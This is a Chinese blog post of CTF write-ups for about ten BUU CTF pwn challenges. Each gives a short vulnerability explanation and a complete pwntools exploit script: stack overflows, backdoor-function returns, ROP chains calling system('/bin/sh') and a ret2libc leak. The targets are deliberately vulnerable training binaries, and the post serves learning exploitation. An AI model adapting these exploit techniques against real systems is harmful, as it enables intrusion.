---
title: "CTF 杂题乱写 0x00 版"
description: "BUU CTF杂题乱写，如有错误请指出"
date: 2026-2-16T00:00:00+08:00
image: ctf_q1.png
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
---

BUU CTF 登录之后，题目链接是对的，没有登录就直接跳转搜索了好像。

只有杂鱼才会乱写杂题。

## 浅水区

可能是窝一辈子都不能企及的高度了。

### ciscn_2019_n_1

[题目链接](https://buuoj.cn/challenges#ciscn_2019_n_1)

IDA 容易发现某变量等于 11.28125 （即 0x41348000）时就会直接 ak，虽然那个变量不可直接修改，但是我们可以栈溢出啊。

<img width="347" height="195" alt="image" src="https://github.com/user-attachments/assets/47a9e491-52b2-4dcf-8682-b0a35e402ed6" />

v1 到 rbp 是 0x30，v2 到 rbp 是 0x4，那么 v1 到 v2 是小学加减法。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 25635
io = remote(host,port)
offset = 0x30 - 0x4
payload = b'A'*offset + p64(0x41348000)     # 11.28125 → 0x41348000

def main():
    io.recvuntil(b"Let's guess the number.\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### pwn1_sctf_2016

[题目链接](https://buuoj.cn/challenges#pwn1_sctf_2016)

容易发现有一个后门函数 `getflag`。

然而再考虑栈溢出的时候发现 `fgets` 只留了 32 的长度读入。

<img width="810" height="509" alt="image" src="https://github.com/user-attachments/assets/05f07cec-cb37-4439-b212-44c41b09695d" />

然而仔细一看后面看似没什么用的代码，竟然把输入的 I 变成了 you，变量到 ebp 有 60 字节可以用 20 个 I 代替。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28374
io = remote(host,port)
get_flag = 0x8048f0d

payload = b'I'*20 + b'A'*4 + p32(get_flag)

def main():
    # io.recvuntil(b"Tell me something about yourself: ")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### jarvisoj_level2

[题目链接](https://buuoj.cn/challenges#jarvisoj_level2)

IDA 轻易发现了 `system`，仔细一看。

<img width="763" height="322" alt="d3d78920d973a73295c7873ed6daf03f" src="https://github.com/user-attachments/assets/31f9d56f-6623-4962-b30a-efe42874079e" />

hint 里面竟然是 binsh。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28040
io = remote(host,port)
offset = 0x88 + 0x4
binsh = 0x804a024
system = 0x804849e
payload = b'A'*offset  + p32(system) + p32(binsh)

def main():
    io.recvuntil(b"Input:\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()

```

### jarvisoj_level2_x64

[题目链接](https://buuoj.cn/challenges#jarvisoj_level2_x64)

换了 64 位，注意寄存器，没啥区别。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29541
io = remote(host,port)
system = 0x40063e
binsh = 0x600a90
pop_rdi_ret = 0x4006b3
offset = 0x88
payload = b'A'*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)

def main():
    io.recvuntil(b"Input:\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### ciscn_2019_n_8

[题目链接](https://buuoj.cn/challenges#ciscn_2019_n_8)

一看保护开的挺全，吓哭了，看看 IDA。

<img width="981" height="493" alt="image" src="https://github.com/user-attachments/assets/e4c43cfd-7055-4d34-adea-455d52fa0d9c" />

竟然是猜猜偏移，😀，笑嘻了，直接爆破了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28863
io = remote(host,port)
# payload = p32(1) + p32(2) + p32(3) + p32(4) + p32(5) + p32(6) + p32(7) + p32(8) + p32(1) + p32(2) + p32(3) + p32(4) + p32(5) + p32(6) + p32(7) + p32(8)
offset = 0x34

payload = b'A'*offset + p32(17)

def main():
    io.recvuntil("What's your name?\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### bjdctf_2020_babystack

[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babystack)

看看 IDA 发现 backdoor，板子栈溢出。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29142
io = remote(host,port)
offset = 0x18
backdoor = 0x4006e6
payload = b'A'*offset + p64(backdoor)

def main():
    io.recvuntil(b"[+]Please input the length of your name:\n")
    io.sendline(b"200")
    io.recvuntil(b"[+]What's u name?\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()

```

### get_started_3dsctf_2016

[题目链接](https://buuoj.cn/challenges#get_started_3dsctf_2016)

什么叫 IDA 里塞这么多东西😰😰😰

哦，又有后门函数。

<img width="1156" height="536" alt="image" src="https://github.com/user-attachments/assets/08662957-5dcd-4c08-ab8f-6b28f8b4aff2" />

哦，两个参数必须一样才执行，32 位传参直接跟在后面就行。

返回地址填一个 exit。

什么叫偏移值不对😰😰😰。

哦没有旧的 rbp，少四个字节。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26192
io = remote(host,port)
offset = 0x38   # 没有 pop ebp，不需要加 4 字节覆盖旧栈底
get_flag = 0x80489a0
exit = 0x804e6a0    # 强迫系统刷新缓冲区，把 flag 吐出来
x1 = 814536271
x2 = 425138641
payload = b'A'*offset + p32(get_flag) + p32(exit) + p32(x1) + p32(x2)


def main():
    # io.recvuntil(b"Qual a palavrinha magica?")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### not_the_same_3dsctf_2016

[题目链接](https://buuoj.cn/challenges#not_the_same_3dsctf_2016)

依旧打开 IDA 一大坨。

依旧后门函数。

<img width="1109" height="490" alt="image" src="https://github.com/user-attachments/assets/d6795ce6-2663-48ec-8dc4-be2bf5f454e1" />

大概就是读取 flag.txt 的内容并且存在内存里，点击看看 fl4g 在哪。

<img width="711" height="150" alt="image" src="https://github.com/user-attachments/assets/daeedcae-6219-4778-ad2b-58e4365db4fd" />

这是好的，那么我们在找一个 printf 和 一个 exit 就好了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 27933
io = remote(host,port)
# io = process("./not_the_same_3dsctf_2016")
offset = 0x2d
getsecret = 0x80489a0
flag = 0x80eca2d
printf = 0x804f0a0
exit = 0x804e660
payload = b'A'*offset + p32(getsecret) + p32(printf) + p32(exit) + p32(flag)

def main():
    # io.recvuntil(b"b0r4 v3r s3 7u 4h o b1ch4o m3m0...")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

## 中水区

可能只有主播这种区才会觉得这里是中水区。

### ciscn_2019_en_2

[题目链接](https://buuoj.cn/challenges#ciscn_2019_en_2)

开了 NX 保护。

<img width="876" height="509" alt="image" src="https://github.com/user-attachments/assets/c21b351e-c933-46c0-976a-8218ba01e0c3" />

主函数告诉你只有操作 1 有意义。

<img width="1017" height="512" alt="image" src="https://github.com/user-attachments/assets/6c4e23ad-3968-4414-8db1-b8321c094a98" />

加密函数告诉你他会对你异或加密，但是 `strlen()` 遇到 `\0` 就截停，可以通过此方法跳过加密。

跳过加密之后就可以泄露 puts 了，ret2libc。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28676
io = remote(host,port)
# io = process("./ciscn_2019_en_2")
elf = ELF('./ciscn_2019_en_2')
offset = 0x57
pop_rdi_ret = 0x400c83
ret = 0x400c84
pop_rsi_r15_ret = 0x400c81
encrypt_addr = 0x4009a0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload_1 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)

def main():
    io.recvuntil(b"Input your choice!\n")
    io.sendline(b"1")
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_1)
    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
    print(hex(puts_addr))   # 0x7f2a1ef599c0
    system_addr = puts_addr - 0x31580
    binsh_addr = puts_addr + 0x1334da
    payload_2 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(ret) + p64(system_addr)
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### ciscn_2019_ne_5

[题目链接](https://buuoj.cn/challenges#ciscn_2019_ne_5)

IDA 打开一看，main 函数一大串，前面有个密码，就是 `administrator`，无意义。

后面四个操作。

操作 1：

<img width="808" height="515" alt="image" src="https://github.com/user-attachments/assets/84d3fd8c-b2d2-4315-99ec-d79902814c0b" />

给 src 赋值，**最长读入长度 128**。

操作 2：

<img width="937" height="425" alt="image" src="https://github.com/user-attachments/assets/ee01314b-44c7-4d7d-a8b1-303bf3f327be" />

输出 src，逗逗你呀。

操作 3：

<img width="997" height="446" alt="image" src="https://github.com/user-attachments/assets/e85a446b-29fc-4d12-a931-e1d85443fbc5" />

有 `system`，OMO。

操作 4：

<img width="1005" height="554" alt="image" src="https://github.com/user-attachments/assets/c00d6a2c-602f-4e65-acec-798b0e5dd88d" />

把 src 粘贴到 dest 上，然后输出 dest，发现 dest 到栈底距离 0x48 = 72，小于128，可以栈溢出。

现在就是去找 `/bin/sh`，ROPgadget 找一下。

<img width="343" height="74" alt="image" src="https://github.com/user-attachments/assets/a863de58-e5f3-46b7-80d6-a356437c77c2" />

其实去 IDA 查一下，发现是 `fflush`，但是能用。

<img width="1020" height="466" alt="image" src="https://github.com/user-attachments/assets/61ee2bf7-ff27-4099-a88c-2cb6fc19d378" />

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 25971
io = remote(host,port)
# io = process('./ciscn_2019_ne_5')
offset = 0x4c
system = 0x80484d0
sh = 0x80482ea
main = 0x8048722
payload = b'A'*offset + p32(system) + p32(main) + p32(sh)

def main():
    io.recvuntil(b"Please input admin password:")
    io.sendline(b"administrator")
    io.recvuntil(b"0.Exit\n:")
    io.sendline(b"1")
    io.recvuntil(b"Please input new log info:")
    io.sendline(payload)
    io.recvuntil(b"0.Exit\n:")
    io.sendline(b"4")
    io.interactive()

if __name__ == "__main__":
    main()
```
